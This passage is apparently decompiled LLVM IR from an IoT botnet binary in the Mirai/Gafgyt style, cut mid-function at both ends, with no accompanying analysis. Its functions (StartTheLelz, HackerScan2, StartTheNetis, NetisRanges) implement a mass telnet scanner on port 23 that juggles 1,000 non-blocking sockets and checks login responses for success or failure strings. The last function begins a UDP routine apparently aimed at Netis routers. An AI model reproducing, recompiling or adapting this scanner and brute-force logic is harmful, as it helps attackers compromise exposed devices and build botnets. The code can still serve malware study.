  %v0_10007948 = call i32 @rand_cmwc()
  %v1_10007958 = trunc i32 %v0_10007948 to i16
  %v3_10007958 = add i32 %tmp1, 4
  %v4_10007958 = inttoptr i32 %v3_10007958 to i16*
  store i16 %v1_10007958, i16* %v4_10007958, align 2
  %v3_10007964 = add i32 %tmp1, 6
  %v4_10007964 = inttoptr i32 %v3_10007964 to i16*
  store i16 0, i16* %v4_10007964, align 2
  %v3_10007970 = add i32 %tmp1, 8
  %v4_10007970 = inttoptr i32 %v3_10007970 to i8*
  store i8 -1, i8* %v4_10007970, align 1
  %v3_1000797c = add i32 %tmp1, 9
  %v4_1000797c = inttoptr i32 %v3_1000797c to i8*
  store i8 %tmp, i8* %v4_1000797c, align 1
  %v3_10007988 = add i32 %tmp1, 10
  %v4_10007988 = inttoptr i32 %v3_10007988 to i16*
  store i16 0, i16* %v4_10007988, align 2
  %v2_10007994 = add i32 %tmp1, 12
  %v3_10007994 = inttoptr i32 %v2_10007994 to i32*
  store i32 %arg3, i32* %v3_10007994, align 4
  %v2_100079a0 = add i32 %tmp1, 16
  %v3_100079a0 = inttoptr i32 %v2_100079a0 to i32*
  store i32 %arg2, i32* %v3_100079a0, align 4
  ret i32 %v0_10007948
}

define i32 @sclose(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100079d8 = icmp sgt i32 %arg1, 2
  br i1 %v2_100079d8, label %dec_label_pc_100079ec, label %dec_label_pc_100079fc

dec_label_pc_100079ec:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_100079f4.249 to i32), i32* @lr, align 4
  %v1_100079f0 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_100079fc

dec_label_pc_100079fc:                            ; preds = %entry, %dec_label_pc_100079ec
  %storemerge = phi i32 [ 0, %dec_label_pc_100079ec ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_100079fc, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10007a38 = add i32 %arg1, 4
  %v2_10007a38 = inttoptr i32 %v1_10007a38 to i32*
  %v3_10007a38 = load i32, i32* %v2_10007a38, align 4
  store i32 %v3_10007a38, i32* %stack_var_-20, align 4
  store i32 268466772, i32* @lr, align 4
  %v3_10007a50 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10007a50
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268466868, i32* @lr, align 4
  %v4_10007ab0 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_10007ac8 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_10007ad8 = load i8, i8* %arg3, align 1
  %v3_10007ae0 = icmp eq i8 %v3_10007ad8, -1
  br i1 %v3_10007ae0, label %dec_label_pc_10007ae8, label %dec_label_pc_10007afc

dec_label_pc_10007ae8:                            ; preds = %entry
  store i32 268466940, i32* @lr, align 4
  %v6_10007af8 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_10007afc

dec_label_pc_10007afc:                            ; preds = %entry, %dec_label_pc_10007ae8
  %v3_10007b08 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_10007b10 = icmp ne i32 %v3_10007b08, 0
  %. = zext i1 %v3_10007b10 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_10007afc, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10007b80 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10007b80, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge

dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge: ; preds = %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge.dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge_crit_edge, %entry
  %v3_10007b98.pre = phi i32 [ %v2_10007b80, %entry ], [ %v3_10007b98.pre.pre, %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge.dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge_crit_edge ]
  %v1_10007bb021 = phi i32 [ 1, %entry ], [ %v1_10007bb0, %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge.dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge_crit_edge ]
  %v1_10007b9c = mul nuw nsw i32 %v1_10007bb021, 4
  %v2_10007ba0 = add i32 %v1_10007b9c, %v3_10007b98.pre
  %v2_10007ba8 = inttoptr i32 %v2_10007ba0 to i32*
  store i32 0, i32* %v2_10007ba8, align 4
  %v1_10007bb0 = add nuw nsw i32 %v1_10007bb021, 1
  %tmp19 = icmp ult i32 %v1_10007bb0, 32
  br i1 %tmp19, label %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge.dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge_crit_edge, label %dec_label_pc_10007bc4

dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge.dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge_crit_edge: ; preds = %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge
  %v3_10007b98.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge

dec_label_pc_10007bc4:                            ; preds = %dec_label_pc_10007b94.dec_label_pc_10007b94_crit_edge
  %v1_10007bc8 = udiv i32 %arg1, 32
  %v1_10007bd0 = mul nuw nsw i32 %v1_10007bc8, 4
  %v2_10007bd4 = ptrtoint i32* %stack_var_-184 to i32
  %v2_10007bd8 = add nuw nsw i32 %v1_10007bd0, 8
  %v1_10007bdc = add i32 %v2_10007bd8, %v2_10007bd4
  %v1_10007be0 = inttoptr i32 %v1_10007bdc to i32*
  %v2_10007be0 = load i32, i32* %v1_10007be0, align 4
  %v1_10007be8 = urem i32 %arg1, 32
  %v3_10007bf0 = shl i32 1, %v1_10007be8
  %v2_10007bf4 = or i32 %v2_10007be0, %v3_10007bf0
  store i32 %v2_10007bf4, i32* %v1_10007be0, align 4
  %v1_10007c10 = add i32 %arg1, 1
  %v2_10007c18 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268467252, i32* @lr, align 4
  %v5_10007c30 = call i32 @__libc_select(i32 %v1_10007c10, i32 %v2_10007b80, i32 0, i32 0, i32 %v2_10007c18)
  %v2_10007c38 = icmp sgt i32 %v5_10007c30, 0
  br i1 %v2_10007c38, label %dec_label_pc_10007c4c, label %dec_label_pc_10007c6c

dec_label_pc_10007c4c:                            ; preds = %dec_label_pc_10007bc4
  store i32 268467300, i32* @lr, align 4
  %v4_10007c60 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10007c6c

dec_label_pc_10007c6c:                            ; preds = %dec_label_pc_10007bc4, %dec_label_pc_10007c4c
  %storemerge = phi i32 [ %v4_10007c60, %dec_label_pc_10007c4c ], [ 0, %dec_label_pc_10007bc4 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10007bb0, { 1, 0 }
  uselistorder i32 %v2_10007b80, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10007c6c, { 1, 0 }
}

define i32 @contains_success(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10007cb4 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_1002a708.253 to i32))
  ret i32 %v3_10007cb4
}

define i32 @contains_fail(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10007d00 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_1002a6e8.261 to i32))
  ret i32 %v3_10007d00

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10007d58

dec_label_pc_10007d58:                            ; preds = %dec_label_pc_10007d58, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10007d5c, %dec_label_pc_10007d58 ]
  %v1_10007d5c = add i32 %stack_var_-36.0, 1
  %v1_10007d68 = mul i32 %v1_10007d5c, 4
  %v2_10007d74 = add i32 %v1_10007d68, %arg2
  %v1_10007d78 = inttoptr i32 %v2_10007d74 to i32*
  %v2_10007d78 = load i32, i32* %v1_10007d78, align 4
  %v3_10007d7c = icmp eq i32 %v2_10007d78, 0
  br i1 %v3_10007d7c, label %dec_label_pc_10007ddc.preheader, label %dec_label_pc_10007d58

dec_label_pc_10007ddc.preheader:                  ; preds = %dec_label_pc_10007d58
  %v2_10007de44 = icmp sgt i32 %v1_10007d5c, 0
  br i1 %v2_10007de44, label %dec_label_pc_10007d90.lr.ph, label %dec_label_pc_10007df4

dec_label_pc_10007d90.lr.ph:                      ; preds = %dec_label_pc_10007ddc.preheader
  %v3_10007db4 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_10007d90

dec_label_pc_10007d90:                            ; preds = %dec_label_pc_10007d90.lr.ph, %dec_label_pc_10007dd0
  %storemerge27 = phi i32 [ 0, %dec_label_pc_10007d90.lr.ph ], [ %v1_10007dd4, %dec_label_pc_10007dd0 ]
  %v1_10007d94 = mul i32 %storemerge27, 4
  %v2_10007da0 = add i32 %v1_10007d94, %arg2
  %v1_10007da4 = inttoptr i32 %v2_10007da0 to i32*
  %v2_10007da4 = load i32, i32* %v1_10007da4, align 4
  store i32 268467640, i32* @lr, align 4
  %v4_10007db4 = call i32 @strcasestr(i8* %v3_10007db4, i32 %v2_10007da4, i32 %v2_10007da0)
  %v3_10007dbc = icmp eq i32 %v4_10007db4, 0
  br i1 %v3_10007dbc, label %dec_label_pc_10007dd0, label %dec_label_pc_10007df4.loopexit

dec_label_pc_10007dd0:                            ; preds = %dec_label_pc_10007d90
  %v1_10007dd4 = add nuw nsw i32 %storemerge27, 1
  %v2_10007de4 = icmp slt i32 %v1_10007dd4, %v1_10007d5c
  br i1 %v2_10007de4, label %dec_label_pc_10007d90, label %dec_label_pc_10007df4.loopexit

dec_label_pc_10007df4.loopexit:                   ; preds = %dec_label_pc_10007dd0, %dec_label_pc_10007d90
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_10007d90 ], [ 0, %dec_label_pc_10007dd0 ]
  br label %dec_label_pc_10007df4

dec_label_pc_10007df4:                            ; preds = %dec_label_pc_10007df4.loopexit, %dec_label_pc_10007ddc.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_10007ddc.preheader ], [ %storemerge.ph, %dec_label_pc_10007df4.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v1_10007d5c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10007d90, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007e14 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007e14, i32* %stack_var_-624, align 4
  store i32 268467792, i32* @lr, align 4
  %v1_10007e4c = call i32 @__GI_time(i32 0)
  %v0_10007e58 = call i32 @rand_cmwc()
  %v2_10007e60 = xor i32 %v1_10007e4c, %v0_10007e58
  store i32 ptrtoint (i32* @global_var_10007e6c.262 to i32), i32* @lr, align 4
  %v1_10007e68 = call i32 @srand(i32 %v2_10007e60)
  store i32 2, i32* %stack_var_-40, align 4
  store i32 23, i32* @r3, align 4
  %v1_10007e78 = call i32 @htons(i32 23)
  %v2_10007e88 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10007e88, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 268467876, i32* @lr, align 4
  %v1_10007ea0 = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r9.global-to-local, align 4
  store i32 268467908, i32* @lr, align 4
  %v3_10007ec0 = call i32 @__GI_memset(i32 %v1_10007ea0, i32 0, i32 1025)
  %v2_10007edc = load i32, i32* %stack_var_-624, align 4
  %v1_10007ee4 = load i32, i32* @r1, align 4
  %v3_10007ee4 = add i32 %v1_10007ee4, -28016
  %v4_10007ee4 = inttoptr i32 %v3_10007ee4 to i32*
  store i32 %v2_10007edc, i32* %v4_10007ee4, align 4
  %v1_10007ef4 = add i32 %v1_10007ee4, -27993
  %v1_10007ef8 = and i32 %v1_10007ef4, -16
  store i32 %v1_10007ef8, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007f28.263 to i32), i32* @lr, align 4
  %v3_10007f24 = call i32 @__GI_memset(i32 %v1_10007ef8, i32 0, i32 5000)
  store i32 1000, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007f34

dec_label_pc_10007f34:                            ; preds = %entry, %dec_label_pc_10007f34
  %storemerge37 = phi i32 [ 0, %entry ], [ %v1_10007fb4, %dec_label_pc_10007f34 ]
  %v1_10007f3c = mul nuw nsw i32 %storemerge37, 28
  %v2_10007f40 = add i32 %v1_10007f3c, %v1_10007ef8
  store i32 %v2_10007f40, i32* %r9.global-to-local, align 4
  %v2_10007f48 = inttoptr i32 %v2_10007f40 to i32*
  store i32 0, i32* %v2_10007f48, align 4
  %v1_10007f50 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f50 = add i32 %v1_10007f50, 4
  %v3_10007f50 = inttoptr i32 %v2_10007f50 to i32*
  store i32 0, i32* %v3_10007f50, align 4
  %v1_10007f58 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f58 = add i32 %v1_10007f58, 8
  %v3_10007f58 = inttoptr i32 %v2_10007f58 to i32*
  store i32 0, i32* %v3_10007f58, align 4
  %v1_10007f60 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f60 = add i32 %v1_10007f60, 12
  %v3_10007f60 = inttoptr i32 %v2_10007f60 to i32*
  store i32 0, i32* %v3_10007f60, align 4
  %v1_10007f68 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f68 = add i32 %v1_10007f68, 16
  %v3_10007f68 = inttoptr i32 %v2_10007f68 to i32*
  store i32 0, i32* %v3_10007f68, align 4
  %v1_10007f70 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f70 = add i32 %v1_10007f70, 20
  %v3_10007f70 = inttoptr i32 %v2_10007f70 to i32*
  store i32 0, i32* %v3_10007f70, align 4
  %v1_10007f78 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007f78 = add i32 %v1_10007f78, 24
  %v3_10007f78 = inttoptr i32 %v2_10007f78 to i32*
  store i32 0, i32* %v3_10007f78, align 4
  %v3_10007f90 = add i32 %v2_10007f40, 9
  %v4_10007f90 = inttoptr i32 %v3_10007f90 to i8*
  store i8 1, i8* %v4_10007f90, align 1
  %v1_10007fa4 = add i32 %v2_10007f40, 24
  %v2_10007fac = inttoptr i32 %v1_10007fa4 to i32*
  store i32 %v1_10007ea0, i32* %v2_10007fac, align 4
  %v1_10007fb4 = add nuw nsw i32 %storemerge37, 1
  store i32 1000, i32* %r9.global-to-local, align 4
  %v2_10007fc4 = icmp slt i32 %v1_10007fb4, 1000
  br i1 %v2_10007fc4, label %dec_label_pc_10007f34, label %dec_label_pc_10007fcc.preheader

dec_label_pc_10007fcc.preheader:                  ; preds = %dec_label_pc_10007f34
  %v2_10008014 = add i32 %v1_10007ef8, 16
  %v2_10008128 = or i32 %v1_10007ef8, 4
  %v2_10008330 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10007fcc

dec_label_pc_10007fcc:                            ; preds = %dec_label_pc_10009070, %dec_label_pc_10007fcc.preheader
  br label %dec_label_pc_10007fd8

dec_label_pc_10007fd8:                            ; preds = %dec_label_pc_10007fcc, %dec_label_pc_10009070
  %storemerge45 = phi i32 [ 0, %dec_label_pc_10007fcc ], [ %v1_10009074, %dec_label_pc_10009070 ]
  %v1_10007fe0 = mul nuw nsw i32 %storemerge45, 28
  %v2_10007fe4 = add i32 %v1_10007fe0, %v1_10007ef8
  %v1_10007fe8 = add i32 %v2_10007fe4, 16
  store i32 %v1_10007fe8, i32* %r9.global-to-local, align 4
  %v1_10007fec = inttoptr i32 %v1_10007fe8 to i32*
  %v2_10007fec = load i32, i32* %v1_10007fec, align 4
  %v3_10007ff0 = icmp eq i32 %v2_10007fec, 0
  br i1 %v3_10007ff0, label %dec_label_pc_10007ff8, label %dec_label_pc_10008020

dec_label_pc_10007ff8:                            ; preds = %dec_label_pc_10007fd8
  store i32 268468228, i32* @lr, align 4
  %v1_10008000 = call i32 @__GI_time(i32 0)
  %v1_10008010 = mul i32 %storemerge45, 28
  %v1_10008018 = add i32 %v2_10008014, %v1_10008010
  store i32 %v1_10008018, i32* %r9.global-to-local, align 4
  %v2_1000801c = inttoptr i32 %v1_10008018 to i32*
  store i32 %v1_10008000, i32* %v2_1000801c, align 4
  br label %dec_label_pc_10008020

dec_label_pc_10008020:                            ; preds = %dec_label_pc_10007fd8, %dec_label_pc_10007ff8
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v1_10008030 = add i32 %v2_10007fe4, 8
  %v2_10008030 = inttoptr i32 %v1_10008030 to i8*
  %v3_10008030 = load i8, i8* %v2_10008030, align 4
  %v2_10008040 = icmp ugt i8 %v3_10008030, 7
  br i1 %v2_10008040, label %dec_label_pc_10009070, label %dec_label_pc_10008048

dec_label_pc_10008048:                            ; preds = %dec_label_pc_10008020
  %v4_10008030 = zext i8 %v3_10008030 to i32
  %v1_1000804c = mul nuw nsw i32 %v4_10008030, 4
  %v2_10008058 = add i32 %v1_1000804c, ptrtoint (i32* @global_var_10016fc0.264 to i32)
  store i32 %v2_10008058, i32* %r9.global-to-local, align 4
  %v1_1000805c = inttoptr i32 %v2_10008058 to i32*
  %v2_1000805c = load i32, i32* %v1_1000805c, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_10008068 = add i32 %v2_1000805c, ptrtoint (i32* @global_var_10016fc0.264 to i32)
  call void @__pseudo_branch(i32 %v2_10008068)
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v1_10008084 = add i32 %v2_10007fe4, 9
  %v2_10008084 = inttoptr i32 %v1_10008084 to i8*
  %v3_10008084 = load i8, i8* %v2_10008084, align 1
  %v3_1000808c = icmp eq i8 %v3_10008084, 1
  store i32 %v1_10007ef8, i32* %r9.global-to-local, align 4
  br i1 %v3_1000808c, label %dec_label_pc_10008094, label %dec_label_pc_10008138

dec_label_pc_10008094:                            ; preds = %dec_label_pc_10008048
  %v1_100080a4 = add i32 %v2_10007fe4, 24
  store i32 %v1_100080a4, i32* %r9.global-to-local, align 4
  %v1_100080a8 = inttoptr i32 %v1_100080a4 to i32*
  %v2_100080a8 = load i32, i32* %v1_100080a8, align 4
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v2_100080c4 = inttoptr i32 %v2_10007fe4 to i32*
  store i32 0, i32* %v2_100080c4, align 4
  %v1_100080cc = load i32, i32* %r9.global-to-local, align 4
  %v2_100080cc = add i32 %v1_100080cc, 4
  %v3_100080cc = inttoptr i32 %v2_100080cc to i32*
  store i32 0, i32* %v3_100080cc, align 4
  %v1_100080d4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080d4 = add i32 %v1_100080d4, 8
  %v3_100080d4 = inttoptr i32 %v2_100080d4 to i32*
  store i32 0, i32* %v3_100080d4, align 4
  %v1_100080dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100080dc = add i32 %v1_100080dc, 12
  %v3_100080dc = inttoptr i32 %v2_100080dc to i32*
  store i32 0, i32* %v3_100080dc, align 4
  %v1_100080e4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080e4 = add i32 %v1_100080e4, 16
  %v3_100080e4 = inttoptr i32 %v2_100080e4 to i32*
  store i32 0, i32* %v3_100080e4, align 4
  %v1_100080ec = load i32, i32* %r9.global-to-local, align 4
  %v2_100080ec = add i32 %v1_100080ec, 20
  %v3_100080ec = inttoptr i32 %v2_100080ec to i32*
  store i32 0, i32* %v3_100080ec, align 4
  %v1_100080f4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100080f4 = add i32 %v1_100080f4, 24
  %v3_100080f4 = inttoptr i32 %v2_100080f4 to i32*
  store i32 0, i32* %v3_100080f4, align 4
  store i32 %v1_100080a4, i32* %r9.global-to-local, align 4
  store i32 %v2_100080a8, i32* %v1_100080a8, align 4
  %v0_10008118 = call i32 @HackerScan2()
  %v0_10008124 = load i32, i32* @r29, align 4
  %v1_10008124 = mul i32 %v0_10008124, 28
  %v1_1000812c = add i32 %v1_10008124, %v2_10008128
  store i32 %v1_1000812c, i32* %r9.global-to-local, align 4
  %v2_10008130 = inttoptr i32 %v1_1000812c to i32*
  store i32 %v0_10008118, i32* %v2_10008130, align 4
  br label %dec_label_pc_10008230

dec_label_pc_10008138:                            ; preds = %dec_label_pc_10008048
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v3_10008148 = load i8, i8* %v2_10008084, align 1
  %v3_10008150 = icmp eq i8 %v3_10008148, 0
  br i1 %v3_10008150, label %dec_label_pc_10008158, label %dec_label_pc_10008230

dec_label_pc_10008158:                            ; preds = %dec_label_pc_10008138
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v1_10008168 = add i32 %v2_10007fe4, 11
  %v2_10008168 = inttoptr i32 %v1_10008168 to i8*
  %v3_10008168 = load i8, i8* %v2_10008168, align 1
  %v1_10008170 = add i8 %v3_10008168, 1
  store i8 %v1_10008170, i8* %v2_10008168, align 1
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v1_10008198 = add i32 %v2_10007fe4, 10
  %v2_10008198 = inttoptr i32 %v1_10008198 to i8*
  %v3_10008198 = load i8, i8* %v2_10008198, align 2
  %v1_100081a0 = add i8 %v3_10008198, 1
  store i8 %v1_100081a0, i8* %v2_10008198, align 2
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v3_100081c8 = load i8, i8* %v2_10008168, align 1
  %v3_100081d0 = icmp eq i8 %v3_100081c8, 3
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  br i1 %v3_100081d0, label %dec_label_pc_100081d8, label %dec_label_pc_100081f4

dec_label_pc_100081d8:                            ; preds = %dec_label_pc_10008158
  store i8 1, i8* %v2_10008084, align 1
  br label %dec_label_pc_10009070

dec_label_pc_100081f4:                            ; preds = %dec_label_pc_10008158
  %v3_10008204 = load i8, i8* %v2_10008198, align 2
  %v3_1000820c = icmp eq i8 %v3_10008204, 3
  br i1 %v3_1000820c, label %dec_label_pc_10008214, label %dec_label_pc_10008230

dec_label_pc_10008214:                            ; preds = %dec_label_pc_100081f4
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008084, align 1
  br label %dec_label_pc_10009070

dec_label_pc_10008230:                            ; preds = %dec_label_pc_100081f4, %dec_label_pc_10008138, %dec_label_pc_10008094
  store i32 2, i32* %stack_var_-40, align 4
  store i32 23, i32* @r3, align 4
  %v1_1000823c = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-32, align 4
  %v1_10008270 = add i32 %v2_10007fe4, 4
  store i32 %v1_10008270, i32* %r9.global-to-local, align 4
  store i32 268468880, i32* @lr, align 4
  %v3_1000828c = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10008298 = mul i32 %storemerge45, 28
  %v2_1000829c = add i32 %v1_10008298, %v1_10007ef8
  %v2_100082a0 = inttoptr i32 %v2_1000829c to i32*
  store i32 %v3_1000828c, i32* %v2_100082a0, align 4
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v1_100082b4 = inttoptr i32 %v2_10007fe4 to i32*
  %v2_100082b4 = load i32, i32* %v1_100082b4, align 4
  store i32 %v2_100082b4, i32* %r9.global-to-local, align 4
  %v4_100082bc = icmp eq i32 %v2_100082b4, -1
  br i1 %v4_100082bc, label %dec_label_pc_10009070, label %dec_label_pc_100082c4

dec_label_pc_100082c4:                            ; preds = %dec_label_pc_10008230
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v2_100082d4 = load i32, i32* %v1_100082b4, align 4
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v2_100082e8 = load i32, i32* %v1_100082b4, align 4
  store i32 268468992, i32* @lr, align 4
  %v2_100082fc = call i32 @__libc_fcntl(i32 %v2_100082e8, i32 3)
  store i32 268469020, i32* @lr, align 4
  %v2_10008318 = call i32 @__libc_fcntl(i32 %v2_100082d4, i32 4)
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v2_1000832c = load i32, i32* %v1_100082b4, align 4
  store i32 %v2_10008330, i32* %r9.global-to-local, align 4
  store i32 268469060, i32* @lr, align 4
  %v3_10008340 = call i32 @__libc_connect(i32 %v2_1000832c, i32 %v2_10008330, i32 16)
  store i32 %v3_10008340, i32* %r9.global-to-local, align 4
  %v4_1000834c = icmp eq i32 %v3_10008340, -1
  br i1 %v4_1000834c, label %dec_label_pc_10008354, label %dec_label_pc_100083a0

dec_label_pc_10008354:                            ; preds = %dec_label_pc_100082c4
  %v0_10008354 = call i32 @__errno_location()
  store i32 %v0_10008354, i32* %r9.global-to-local, align 4
  %v1_1000835c = inttoptr i32 %v0_10008354 to i32*
  %v2_1000835c = load i32, i32* %v1_1000835c, align 4
  %v3_10008360 = icmp eq i32 %v2_1000835c, 115
  br i1 %v3_10008360, label %dec_label_pc_100083a0, label %dec_label_pc_10008368

dec_label_pc_10008368:                            ; preds = %dec_label_pc_10008354
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  %v2_10008378 = load i32, i32* %v1_100082b4, align 4
  %v2_10008380 = call i32 @sclose(i32 %v2_10008378, i32 %v2_10007fe4)
  store i32 %v2_10007fe4, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008084, align 1
  br label %dec_label_pc_10009070

dec_label_pc_100083a0:                            ; preds = %dec_label_pc_100082c4, %dec_label_pc_10008354
  store i8 1, i8* %v2_10008030, align 4
  store i32 %v1_10007fe8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %v1_10007fec, align 4
  br label %dec_label_pc_10009070

dec_label_pc_10009070:                            ; preds = %dec_label_pc_10008230, %dec_label_pc_10008020, %dec_label_pc_100083a0, %dec_label_pc_10008368, %dec_label_pc_10008214, %dec_label_pc_100081d8
  %v1_10009074 = add nuw nsw i32 %storemerge45, 1
  %v2_10009084 = icmp slt i32 %v1_10009074, 1000
  br i1 %v2_10009084, label %dec_label_pc_10007fd8, label %dec_label_pc_10007fcc

; uselistorder directives
  uselistorder i8* %v2_10008198, { 1, 0, 2 }
  uselistorder i8* %v2_10008168, { 1, 0, 2 }
  uselistorder i8* %v2_10008084, { 3, 0, 1, 2, 4 }
  uselistorder i8 %v3_10008030, { 1, 0 }
  uselistorder i32 %v2_10007fe4, { 7, 9, 8, 10, 11, 12, 14, 13, 15, 0, 1, 2, 4, 3, 6, 5, 19, 17, 16, 18, 21, 20, 23, 22, 24 }
  uselistorder i32 %storemerge45, { 3, 1, 0, 2 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v1_10007ef8, { 0, 4, 1, 3, 5, 2, 6, 7 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 46, 29, 30, 31, 32, 33, 41, 34, 35, 36, 37, 38, 39, 40, 45, 42, 43, 44 }
  uselistorder i32 1000, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10009070, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_100083a0, { 1, 0 }
  uselistorder label %dec_label_pc_10008020, { 1, 0 }
  uselistorder label %dec_label_pc_10007fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10007f34, { 1, 0 }
}

define i32 @StartTheNetis(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1044 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v2_1000910c = ptrtoint i32* %stack_var_-1044 to i32
  %v2_1000913c = ptrtoint i32* %stack_var_-1060 to i32
  br label %dec_label_pc_100090a4

dec_label_pc_100090a4:                            ; preds = %dec_label_pc_100090a4, %entry
  store i32 268472500, i32* @lr, align 4
  %v3_100090b0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268472512, i32* @lr, align 4
  %v0_100090bc = call i32 @NetisRanges()
  store i32 2, i32* %stack_var_-1060, align 4
